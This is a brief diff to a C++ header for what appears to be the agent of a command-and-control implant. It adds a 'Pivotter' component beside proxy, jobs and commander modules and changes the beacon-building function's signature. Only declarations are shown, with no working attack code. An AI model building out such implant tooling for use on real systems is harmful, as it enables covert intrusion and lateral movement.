@@ -6,6 +6,7 @@
 #include "JobsController.h"
 #include "MemorySaver.h"
 #include "Proxyfire.h"
+#include "Pivotter.h"
 #include "Commander.h"
 
 class Commander;
@@ -20,6 +21,7 @@ public:
 	JobsController* jober		= NULL;
 	MemorySaver*    memorysaver = NULL;
 	Proxyfire*		proxyfire	= NULL;
+	Pivotter*       pivotter    = NULL;
 
 	BYTE* SessionKey = NULL;
 
@@ -27,6 +29,5 @@ public:
 
 	void  SetActive(BOOL state);
 	BOOL  IsActive();
-	LPSTR BuildBeat();
-	LPSTR CreateHeaders();
+	BYTE* BuildBeat(ULONG* size);
 };
